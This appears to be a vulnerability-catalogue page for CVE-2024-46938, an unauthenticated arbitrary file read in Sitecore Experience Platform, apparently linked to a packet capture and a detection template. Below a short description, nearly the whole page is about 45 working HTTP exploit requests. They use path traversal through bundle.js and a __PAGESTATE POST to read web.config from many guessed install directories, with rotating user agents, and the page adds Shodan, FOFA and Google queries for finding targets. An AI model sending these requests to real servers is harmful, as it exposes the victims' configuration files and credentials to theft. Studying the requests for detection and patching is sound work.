---
layout: post
cve_id: CVE-2024-46938
title: Sitecore Experience Platform <= 10.4 - Arbitrary File Read
pcap: true
pcap_path: /pcaps/2024/CVE-2024-46938.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-46938.yaml
snort2_rule: N/A
snort3_rule: N/A
author: DhiyaneshDK
severity: high
impact: 'Unauthenticated attackers can read arbitrary files from the Sitecore server,
  potentially exposing sensitive configuration and credentials.

  '
remediation: 'Update Sitecore Experience Platform to a version that patches CVE-2024-46938.

  '
reference:
- https://www.assetnote.io/resources/research/leveraging-an-order-of-operations-bug-to-achieve-rce-in-sitecore-8-x---10-x
- https://nvd.nist.gov/vuln/detail/CVE-2024-46938
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2024-46938
  epss-score: 0.93306
  epss-percentile: 0.99797
  cpe: cpe:2.3:a:sitecore:experience_commerce:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 45
  vendor: sitecore
  product: experience_commerce
  shodan-query: http.title:"sitecore"
  fofa-query: title="sitecore"
  google-query: intitle:"sitecore"
tags:
- cve
- cve2024
- sitecore
- lfi
- rce
- vkev
- vuln
---

## ðŸ” Vulnerability Description
An issue was discovered in Sitecore Experience Platform (XP), Experience Manager (XM), and Experience Commerce (XC) 8.0 Initial Release through 10.4 Initial Release. An unauthenticated attacker can read arbitrary files.


## ðŸŒ HTTP Request
```nohighlight
GET /-/media/doo-doo.ashx HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
POST /-/xaml/Sitecore.Shell.Applications.ContentEditor.Dialogs.EditHtml.ValidateXHtml?hdl=a HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Connection: close
Content-Length: 22
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

__PAGESTATE=/../../x/x
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\sitecore\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6.1 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\sitecore1\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\sxa\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\XP0.sc\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\Sitecore82\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\Sitecore81\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\Sitecore81u2\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\Sitecore7\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\Sitecore8\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\Sitecore70\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\Sitecore72\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0.1 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\Sitecore71\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\Sitecore75\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_10_3 rv:2.0; so-DJ) AppleWebKit/533.15.6 (KHTML, like Gecko) Version/4.0.2 Safari/533.15.6
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\SitecoreInstance\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\Websites\spe.dev.local\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\SitecoreSPE_8\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\SitecoreSPE_91\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\Sitecore9\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\sitecore93sc.dev.local\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15 AlohaBrowser/7.6.0
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\Sitecore81u3\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\sitecore9.sc\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\sitecore901xp0.sc\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\sitecore9-website\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\sitecore93.sc\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.3
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\wwwroot\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.13 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.com.sc\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14816.131.5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.com.sc\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\victim.com.sc\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.com\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/2008052906 Firefox/3.0
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\victim.com\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.com\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.com.sitecore\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/15.1 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.com.sitecore\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\victim.com.sitecore\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.com.website\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.com.website\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.10 Safari/605.1.1
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\victim.com.website\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.com.dev.local\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.com.dev.local\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\victim.com.dev.local\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.comsc.dev.local\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.7.20) Gecko/ Firefox/3.6.20
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\www.victim.comsc.dev.local\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.1 Safari/525.20
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /-/speak/v1/bundles/bundle.js?f=C:\inetpub\victim.comsc.dev.local\sitecore\shell\client\..\..\..\web.config%23.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept-Encoding: gzip
Connection: close
```

